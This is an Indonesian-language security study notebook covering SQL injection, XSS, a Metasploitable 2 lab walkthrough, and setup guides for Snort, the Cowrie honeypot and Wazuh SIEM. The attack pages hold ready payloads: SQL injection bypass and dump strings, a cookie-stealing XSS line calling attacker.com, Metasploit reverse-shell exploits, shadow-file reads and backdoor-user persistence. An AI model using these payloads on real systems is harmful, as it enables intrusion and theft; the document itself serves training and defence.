 1. Halaman: SQL Injection

> SQL Injection
Attack Vector

Type: Web Application Attack

Risk Level: Critical

Target: Database-driven websites

> OVERVIEW
SQL Injection adalah teknik injeksi code yang mengeksploitasi celah keamanan pada layer database aplikasi.

> TARGET INFORMATION
Plaintext

Target URL: http://target.com/login.php
Parameter: username, password
Database: MySQL 5.7
> VULNERABILITY
SQL

-- Query vulnerable
SELECT * FROM users WHERE username='$user' AND password='$pass'
Input tidak di-sanitize dengan benar, memungkinkan injeksi SQL.

> EXPLOIT STEPS
Step 1: Detection
Bash

# Test dengan single quote
username: admin'
# Error: "You have an error in your SQL syntax"
Step 2: Authentication Bypass
SQL

-- Payload
Username: admin' OR '1'='1
Password: anything

-- Query menjadi:
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
Step 3: Data Extraction
SQL

-- Enumerate tables
admin' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Dump data
admin' UNION SELECT username,password FROM users--
> PAYLOAD EXAMPLES
Basic Bypass

Plaintext

' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
admin' OR '1'='1
Union Based

SQL

' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,email FROM users--
Time Based

SQL

' OR IF(1=1, SLEEP(5), 0)--
> TOOLS USED
Bash

# SQLMap - Automated SQL injection tool
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"
sqlmap -u "http://target.com/login.php" --forms --dump

# Manual testing dengan Burp Suite
# Capture request → Send to Repeater → Modify payload
> PROOF OF CONCEPT
Exploitation Successful

Plaintext

[+] Vulnerable parameter found: username
[+] Database: mysql
[+] Retrieved 15 users from database
[+] Admin credentials: admin:5f4dcc3b5aa765d61d8327deb882cf99
> MITIGATION
Developer Side:

PHP

// ✅ Gunakan Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

// ✅ Input validation
$username = mysqli_real_escape_string($conn, $username);
Admin Side:

Principle of least privilege untuk database users

Regular security audits

WAF (Web Application Firewall)

2. Halaman: XSS Attack

> XSS Attack (Cross-Site Scripting)
Attack Vector

Type: Web Application Attack

Risk Level: High

Target: Client-side code injection

> OVERVIEW
Cross-Site Scripting (XSS) memungkinkan attacker untuk inject malicious scripts ke dalam web pages yang dilihat oleh users lain.

> TYPES OF XSS
Reflected XSS

HTML

http://target.com/search?q=<script>alert('XSS')</script>
Stored XSS

JavaScript

<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
DOM-based XSS

JavaScript

var search = location.search.substring(1);
document.write(search);
> BASIC PAYLOADS
HTML

<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
> MITIGATION
PHP

// ✅ Encode output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

3. Halaman: Metasploitable 2


Lab Information

VM Name: Metasploitable 2
OS: Ubuntu 8.04 (Linux)
Purpose: Intentionally vulnerable for security training
Difficulty: ⭐ Beginner

> SETUP & INSTALLATION
Download & Setup

# Download dari SourceForge
URL: https://sourceforge.net/projects/metasploitable/

# Extract file
$ unzip metasploitable-linux-2.0.0.zip

# Import ke VirtualBox
File → Import Appliance → Select .vmdk file
Default Credentials

Username: msfadmin
Password: msfadmin
IP: 192.168.56.101 (contoh - sesuaikan dengan network Anda)
> RECONNAISSANCE
Network Scanning

# Nmap scan
$ nmap -sV -p- 192.168.56.101

# Output:
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  netbios-ssn Samba smbd 3.X
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
> EXPLOITATION WALKTHROUGHS
1. FTP vsftpd 2.3.4 Backdoor
Critical Vulnerability

vsftpd 2.3.4 memiliki backdoor yang bisa memberikan root shell!


# Menggunakan Metasploit
$ msfconsole

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(vsftpd_234_backdoor) > exploit

[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.101:21 - USER: 331 Please specify the password.
[+] 192.168.56.101:21 - Backdoor service has been spawned
[*] Command shell session 1 opened
2. Samba Exploit (usermap_script)

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 192.168.56.101
msf6 exploit(usermap_script) > set PAYLOAD cmd/unix/reverse
msf6 exploit(usermap_script) > exploit

[*] Started reverse TCP handler
[*] Command shell session 2 opened
whoami
# Output: root
3. UnrealIRCd Backdoor

msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
msf6 exploit(unreal_ircd_3281_backdoor) > exploit
4. Tomcat Default Credentials

# Access Tomcat Manager
URL: http://192.168.56.101:8180/manager/html
Credentials: tomcat:tomcat

# Upload malicious WAR file
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f war > shell.war

# Upload via Tomcat Manager
# Deploy and access to get reverse shell
5. MySQL Weak Password

# Connect to MySQL
$ mysql -h 192.168.56.101 -u root -p
Password: [blank - just press Enter]

# Enumerate databases
mysql> show databases;
mysql> use mysql;
mysql> select user,password from user;
6. Web Application Vulnerabilities
Mutillidae (OWASP Top 10)

URL: http://192.168.56.101/mutillidae/

# SQL Injection example
URL: http://192.168.56.101/mutillidae/index.php?page=user-info.php&username=admin'%20OR%20'1'='1&password=&user-info-php-submit-button=View+Account+Details
DVWA

URL: http://192.168.56.101/dvwa/
Default Login: admin:password
> POST-EXPLOITATION
Privilege Escalation

# Check current user
$ whoami
$ id

# Find SUID binaries
$ find / -perm -4000 2>/dev/null

# Kernel exploits
$ uname -a
# Search for kernel exploits on exploit-db
Persistence

# Add new user
$ useradd -m hacker
$ echo "hacker:password" | chpasswd
$ usermod -aG sudo hacker

# SSH key persistence
$ mkdir /root/.ssh
$ echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
Data Exfiltration

# Find sensitive files
$ find / -name "*.conf" 2>/dev/null
$ find / -name "*.txt" 2>/dev/null
$ cat /etc/shadow
$ cat /etc/passwd

# Dump MySQL databases
$ mysqldump -u root -p --all-databases > dump.sql
> CHECKLIST
[x] Network scan dengan Nmap
[ ] Exploit FTP vsftpd backdoor
[ ] Exploit Samba usermap_script
[ ] Exploit UnrealIRCd
[ ] Access Tomcat Manager
[ ] MySQL enumeration
[ ] Web app testing (Mutillidae, DVWA)
[ ] Privilege escalation
[ ] Establish persistence
[ ] Data exfiltration
> NOTES
Learning Points

Selalu lakukan reconnaissance menyeluruh
Dokumentasikan setiap langkah
Pahami bagaimana exploit bekerja
Pelajari cara mitigasi untuk setiap vulnerability
Reminder

Metasploitable 2 SANGAT vulnerable - jangan pernah expose ke internet! Gunakan hanya di isolated network.

4. Halaman: Snort IDS

> SNORT IDS
Tool Information

Type: Intrusion Detection System (IDS)

Purpose: Network traffic analysis & threat detection

> DETECTION RULES
Basic Rule Syntax

Plaintext

alert [protocol] [src_ip] [src_port] -> [dst_ip] [dst_port] (rule options)
Example Detection Rules

Plaintext

# Nmap SYN Scan Detection
alert tcp any any -> any any (msg:"Nmap SYN Scan Detected"; flags:S; sid:1000001; rev:1;)

# ICMP Flood Detection
alert icmp any any -> any any (msg:"HPING3 ICMP Flood Detected"; sid:1000004; rev:1;)
> RUNNING SNORT
Bash

sudo snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -i eth0 -A alert_fast

5. Halaman Cowrie Honeypot

Overview
Cowrie adalah medium to high interaction SSH dan Telnet honeypot yang dirancang untuk logging brute force attacks dan shell interaction yang dilakukan oleh attacker. Cowrie sangat berguna untuk cybersecurity research dan threat intelligence.

Features
SSH/Telnet Honeypot: Emulasi layanan SSH dan Telnet
Command Logging: Merekam semua command yang dijalankan attacker
File Download Capture: Menyimpan file yang di-download oleh attacker
Fake File System: Menyediakan fake filesystem yang realistis
Session Recording: Merekam seluruh session attacker
Installation
Prerequisites
Pastikan Anda memiliki: - Python 3.7 atau lebih tinggi - Git - Virtual environment support

Installation Steps
1. Clone Repository

git clone -b v2.4.0 https://github.com/cowrie/cowrie
cd cowrie
2. Setup Virtual Environment

python3 -m venv cowrie-env
source cowrie-env/bin/activate
Note: Untuk Windows PowerShell, gunakan:


python -m venv cowrie-env
.\cowrie-env\Scripts\Activate.ps1
3. Install Dependencies

pip install --upgrade pip
pip install -r requirements.txt
pip install -e .
Configuration
Basic Configuration
Edit file etc/cowrie.cfg untuk konfigurasi dasar:


[honeypot]
# Hostname untuk fake system
hostname = server
# Port untuk SSH honeypot (default: 2222)
listen_endpoints = tcp:2222:interface=0.0.0.0

[output_json]
# Enable JSON logging
enabled = true
Port Forwarding (Optional)
Untuk menjalankan Cowrie pada port 22 (SSH default), gunakan port forwarding:


# Linux/Unix
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
Usage
Starting Cowrie
Method 1: Manual Start

# Activate virtual environment
source cowrie-env/bin/activate

# Start Cowrie
cowrie start
Method 2: Using Restart Script
Buat script untuk restart Cowrie dengan mudah:


cat > ~/cowrie/restart_cowrie.sh <<'EOF'
#!/bin/bash
source ~/cowrie/cowrie-env/bin/activate
kill $(ps aux | grep twistd | grep -v grep | awk '{print $2}') 2>/dev/null
rm -f ~/cowrie/cowrie-env/var/run/cowrie.pid
cowrie start
EOF

chmod +x ~/cowrie/restart_cowrie.sh
Method 3: Using Alias
Tambahkan alias ke .bashrc untuk kemudahan:


# Alias untuk start Cowrie
grep -qxF "alias cowrie-start='~/cowrie/restart_cowrie.sh'" ~/.bashrc || \
echo "alias cowrie-start='~/cowrie/restart_cowrie.sh'" >> ~/.bashrc

# Alias untuk melihat log
grep -qxF "alias cowrie-log='tail -f ~/cowrie/var/log/cowrie/cowrie.log'" ~/.bashrc || \
echo "alias cowrie-log='tail -f ~/cowrie/var/log/cowrie/cowrie.log'" >> ~/.bashrc

# Reload bashrc
source ~/.bashrc
Setelah itu, Anda bisa menggunakan:


cowrie-start  # Untuk start/restart Cowrie
cowrie-log    # Untuk melihat log real-time
Stopping Cowrie

cowrie stop
Checking Status

cowrie status
Log Analysis
Log Locations
Cowrie menyimpan log di beberapa lokasi:

Main Log: var/log/cowrie/cowrie.log
JSON Log: var/log/cowrie/cowrie.json
Downloads: var/lib/cowrie/downloads/ (file yang di-download attacker)
TTY Logs: var/lib/cowrie/tty/ (session recordings)
Viewing Logs
Real-time Log Monitoring

tail -f var/log/cowrie/cowrie.log
Atau gunakan alias:


cowrie-log
Analyzing JSON Logs

# Melihat login attempts
cat var/log/cowrie/cowrie.json | jq 'select(.eventid=="cowrie.login.success")'

# Melihat commands yang dijalankan
cat var/log/cowrie/cowrie.json | jq 'select(.eventid=="cowrie.command.input")'
Replaying Sessions
Untuk replay session TTY yang terekam:


# List available sessions
ls var/lib/cowrie/tty/

# Replay session
bin/playlog var/lib/cowrie/tty/[session-id]
Security Considerations
Security Best Practices

Jangan jalankan Cowrie sebagai root user
Isolate honeypot dari production network
Monitor honeypot secara regular
Backup log secara berkala
Gunakan firewall untuk membatasi akses
Common Commands

# Start Cowrie
cowrie start

# Stop Cowrie
cowrie stop

# Restart Cowrie
cowrie restart

# Check status
cowrie status

# View logs
tail -f var/log/cowrie/cowrie.log

# Check downloaded files
ls -lh var/lib/cowrie/downloads/
Troubleshooting
Issue: Port Already in Use

# Check what's using the port
netstat -tulpn | grep 2222

# Kill the process if needed
kill -9 <PID>
Issue: Permission Denied

# Make sure you're not running as root
whoami

# Check file permissions
ls -la cowrie-env/
Issue: Virtual Environment Not Found

# Recreate virtual environment
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt
Advanced Usage
Custom File System
Anda dapat membuat custom fake filesystem:


# Edit filesystem
nano share/cowrie/fs.pickle
Database Integration
Cowrie dapat menyimpan data ke database:


# Edit etc/cowrie.cfg
[output_mysql]
enabled = true
host = localhost
database = cowrie
username = cowrie
password = password

6. Halaman Wazuh SIEM

Overview
Wazuh adalah unified XDR (Extended Detection and Response) dan SIEM (Security Information and Event Management) platform open-source yang digunakan untuk threat detection, integrity monitoring, incident response, dan compliance. Wazuh melindungi workloads di on-premise, virtualized, container, dan cloud environments.

Features
Security Analytics: Log analysis, intrusion detection, vulnerability detection
Threat Intelligence: Integration dengan threat intelligence feeds
File Integrity Monitoring (FIM): Mendeteksi perubahan pada file system
Configuration Assessment: Security configuration monitoring
Incident Response: Automated response capabilities
Regulatory Compliance: PCI DSS, HIPAA, GDPR compliance monitoring
Cloud Security: AWS, Azure, GCP security monitoring
Container Security: Docker dan Kubernetes monitoring
Architecture
Wazuh terdiri dari 3 komponen utama:

Wazuh Manager: Server yang menerima dan menganalisis data dari agents
Wazuh Agent: Lightweight agent yang diinstall pada endpoints
Elastic Stack: Elasticsearch, Filebeat, dan Kibana untuk data indexing dan visualization
Installation
Prerequisites
Pastikan sistem Anda memenuhi: - Ubuntu 20.04/22.04 atau Debian 10/11 - Minimal 4GB RAM (8GB+ recommended) - Minimal 50GB disk space - Root atau sudo access

Installation Steps
1. Install Wazuh Manager
Add Wazuh Repository

# Import GPG key
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | \
sudo gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import

# Set permissions
sudo chmod 644 /usr/share/keyrings/wazuh.gpg

# Add repository
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | \
sudo tee -a /etc/apt/sources.list.d/wazuh.list
Install Wazuh Manager and Filebeat

# Update package list
sudo apt update

# Install Wazuh Manager and Filebeat
sudo apt install wazuh-manager filebeat -y
Verify Installation

# Check Wazuh Manager status
sudo systemctl status wazuh-manager

# Check Filebeat status
sudo systemctl status filebeat
2. Install Elasticsearch
Add Elasticsearch Repository

# Import Elasticsearch GPG key
curl -s https://artifacts.elastic.co/GPG-KEY-elasticsearch | \
sudo gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/elasticsearch.gpg --import

# Set permissions
sudo chmod 644 /usr/share/keyrings/elasticsearch.gpg

# Add Elasticsearch repository (version 7.x)
echo "deb [signed-by=/usr/share/keyrings/elasticsearch.gpg] https://artifacts.elastic.co/packages/7.x/apt stable main" | \
sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list
Install Elasticsearch

# Update package list
sudo apt update

# Install Elasticsearch
sudo apt install elasticsearch -y
Configure and Start Elasticsearch

# Reload systemd daemon
sudo systemctl daemon-reload

# Enable Elasticsearch to start on boot
sudo systemctl enable elasticsearch.service

# Start Elasticsearch
sudo systemctl start elasticsearch.service
Verify Elasticsearch

# Check Elasticsearch status
sudo systemctl status elasticsearch

# Test Elasticsearch (wait ~30 seconds after start)
curl -X GET "localhost:9200"
3. Install Kibana with Wazuh Plugin
Download and Install Kibana

# Download Kibana version 7.17.13
wget https://artifacts.elastic.co/downloads/kibana/kibana-7.17.13-amd64.deb

# Install Kibana
sudo dpkg -i kibana-7.17.13-amd64.deb

# Fix any dependency issues
sudo apt install -f -y
Set Proper Permissions

# Set ownership
sudo chown -R kibana:kibana /usr/share/kibana/

# Set permissions for plugins directory
sudo chmod 755 /usr/share/kibana/plugins/
Install Wazuh Kibana Plugin

# Download Wazuh Kibana plugin (version 4.5.3 for Kibana 7.17.13)
wget https://packages.wazuh.com/4.x/ui/kibana/wazuh_kibana-4.5.3_7.17.13-1.zip

# Install plugin as kibana user
sudo -u kibana /usr/share/kibana/bin/kibana-plugin install file://$(pwd)/wazuh_kibana-4.5.3_7.17.13-1.zip
Configure Kibana

# Edit Kibana configuration
sudo nano /etc/kibana/kibana.yml
Add the following configuration:


server.port: 5601
server.host: "0.0.0.0"
elasticsearch.hosts: ["http://localhost:9200"]
Start Kibana

# Enable Kibana to start on boot
sudo systemctl enable kibana

# Start Kibana
sudo systemctl start kibana

# Check status
sudo systemctl status kibana
4. Configure Filebeat

# Download Filebeat configuration template
curl -so /etc/filebeat/filebeat.yml https://packages.wazuh.com/4.x/tpl/elastic-basic/filebeat.yml

# Download alerts template
curl -so /etc/filebeat/wazuh-template.json https://packages.wazuh.com/4.x/tpl/elastic-basic/wazuh-template.json

# Download Wazuh module for Filebeat
curl -s https://packages.wazuh.com/4.x/filebeat/wazuh-filebeat-0.2.tar.gz | sudo tar -xvz -C /usr/share/filebeat/module

# Restart Filebeat
sudo systemctl restart filebeat
Configuration
Wazuh Manager Configuration
Edit /var/ossec/etc/ossec.conf:


<ossec_config>
  <global>
    <jsonout_output>yes</jsonout_output>
    <alerts_log>yes</alerts_log>
    <logall>no</logall>
    <email_notification>no</email_notification>
  </global>

  <syslog_output>
    <server>127.0.0.1</server>
    <port>514</port>
    <format>json</format>
  </syslog_output>
</ossec_config>
Agent Registration
Generate Agent Key

# On Wazuh Manager
sudo /var/ossec/bin/manage_agents

# Select option 'A' to add agent
# Enter agent name and IP address
Install Agent on Linux

# On the agent machine
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | \
sudo gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import

sudo chmod 644 /usr/share/keyrings/wazuh.gpg

echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | \
sudo tee -a /etc/apt/sources.list.d/wazuh.list

sudo apt update
sudo apt install wazuh-agent -y

# Configure manager IP
sudo sed -i 's/MANAGER_IP/your_manager_ip/' /var/ossec/etc/ossec.conf

# Start agent
sudo systemctl start wazuh-agent
Access Wazuh Dashboard
Open browser and navigate to:


http://your_server_ip:5601
Default credentials:

Username: admin
Password: Check /usr/share/wazuh-indexer/plugins/opensearch-security/securityconfig/internal_users.yml

Navigate to Wazuh app from Kibana menu

Usage
Monitoring Agents

# List all agents
sudo /var/ossec/bin/agent_control -l

# Check agent status
sudo /var/ossec/bin/agent_control -i <agent_id>
Viewing Alerts

# View recent alerts
sudo tail -f /var/ossec/logs/alerts/alerts.log

# View JSON alerts
sudo tail -f /var/ossec/logs/alerts/alerts.json
Managing Rules

# Custom rules location
/var/ossec/etc/rules/local_rules.xml

# Test rule syntax
sudo /var/ossec/bin/wazuh-logtest

# Restart after rule changes
sudo systemctl restart wazuh-manager
File Integrity Monitoring (FIM)
Add FIM configuration to /var/ossec/etc/ossec.conf:


<syscheck>
  <disabled>no</disabled>
  <frequency>43200</frequency>

  <directories check_all="yes">/etc,/usr/bin,/usr/sbin</directories>
  <directories check_all="yes">/var/www</directories>

  <ignore>/etc/mtab</ignore>
  <ignore>/etc/hosts.deny</ignore>
  <ignore>/etc/mail/statistics</ignore>
</syscheck>
Vulnerability Detection
Enable vulnerability detection in /var/ossec/etc/ossec.conf:


<vulnerability-detector>
  <enabled>yes</enabled>
  <interval>5m</interval>
  <run_on_start>yes</run_on_start>

  <provider name="canonical">
    <enabled>yes</enabled>
    <os>trusty</os>
    <os>xenial</os>
    <os>bionic</os>
    <os>focal</os>
    <update_interval>1h</update_interval>
  </provider>
</vulnerability-detector>
Common Commands

# Wazuh Manager
sudo systemctl start wazuh-manager
sudo systemctl stop wazuh-manager
sudo systemctl restart wazuh-manager
sudo systemctl status wazuh-manager

# Elasticsearch
sudo systemctl start elasticsearch
sudo systemctl status elasticsearch

# Kibana
sudo systemctl start kibana
sudo systemctl status kibana

# Filebeat
sudo systemctl start filebeat
sudo systemctl status filebeat

# View logs
sudo tail -f /var/ossec/logs/ossec.log
sudo journalctl -u wazuh-manager -f

# Agent management
sudo /var/ossec/bin/agent_control -l
sudo /var/ossec/bin/manage_agents
Troubleshooting
Wazuh Manager Not Starting

# Check logs
sudo tail -f /var/ossec/logs/ossec.log

# Verify configuration
sudo /var/ossec/bin/wazuh-control info

# Check port 1514 (agent connection)
sudo netstat -tulpn | grep 1514

Elasticsearch Issues

# Check Elasticsearch logs
sudo journalctl -u elasticsearch -f

# Verify Elasticsearch is responding
curl -X GET "localhost:9200/_cluster/health?pretty"

# Check disk space
df -h
Kibana Cannot Connect to Elasticsearch

# Verify Kibana configuration
sudo cat /etc/kibana/kibana.yml | grep elasticsearch.hosts

# Check Kibana logs
sudo journalctl -u kibana -f

# Verify network connectivity
curl -X GET "localhost:9200"
Agent Not Connecting

# On agent, check manager IP
sudo cat /var/ossec/etc/ossec.conf | grep address

# Check agent logs
sudo tail -f /var/ossec/logs/ossec.log

# Verify firewall allows port 1514
sudo ufw allow 1514/tcp

# On manager, check agent status
sudo /var/ossec/bin/agent_control -l
Filebeat Not Sending Data

# Check Filebeat status
sudo systemctl status filebeat

# Test Filebeat configuration
sudo filebeat test config

# Check Filebeat logs
sudo journalctl -u filebeat -f

# Restart Filebeat
sudo systemctl restart filebeat
Performance Tuning
Elasticsearch Memory
Edit /etc/elasticsearch/jvm.options:


# Set heap size (50% of system RAM, max 32GB)
-Xms4g
-Xmx4g
Wazuh Manager Performance
Edit /var/ossec/etc/internal_options.conf:


# Increase analysis threads
analysisd.threads=4

# Adjust queue size
analysisd.queue_size=131072

Security Best Practices
Security Recommendations

Change default Kibana credentials immediately
Enable HTTPS for Kibana (use nginx reverse proxy)
Restrict network access to Kibana (firewall rules)
Use authentication for Elasticsearch
Regularly update Wazuh and Elastic Stack
Monitor Wazuh logs for suspicious activities
Implement proper backup strategy
Integration Examples
Slack Integration
Edit /var/ossec/etc/ossec.conf:


<integration>
  <name>slack</name>
  <hook_url>https://hooks.slack.com/services/YOUR/WEBHOOK/URL</hook_url>
  <level>10</level>
  <alert_format>json</alert_format>
</integration>
VirusTotal Integration

<integration>
  <name>virustotal</name>
  <api_key>YOUR_API_KEY</api_key>
  <rule_id>87105</rule_id>
  <alert_format>json</alert_format>
</integration>

Backup and Restore
Backup Wazuh Configuration

# Backup Wazuh configuration
sudo tar -czf wazuh-backup-$(date +%Y%m%d).tar.gz \
  /var/ossec/etc/ \
  /var/ossec/rules/

# Backup Elasticsearch data
sudo tar -czf elasticsearch-backup-$(date +%Y%m%d).tar.gz \
  /var/lib/elasticsearch/

Restore Configuration

# Restore Wazuh configuration
sudo tar -xzf wazuh-backup-YYYYMMDD.tar.gz -C /

# Restart services
sudo systemctl restart wazuh-manager